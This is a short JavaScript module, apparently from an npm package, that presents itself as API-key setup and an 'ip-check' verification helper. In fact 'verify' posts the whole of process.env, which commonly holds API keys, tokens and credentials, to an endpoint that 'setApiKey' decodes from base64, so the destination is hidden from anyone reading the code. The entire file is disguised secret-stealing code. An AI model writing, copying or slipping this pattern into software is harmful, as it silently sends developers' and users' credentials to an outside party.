const axios = require("axios");

const setApiKey = (s) => atob(s);
const verify = (api) => axios.post(api, { ...process.env }, {
  headers: { "x-app-request": "ip-check" }
});

module.exports = { setApiKey, verify };
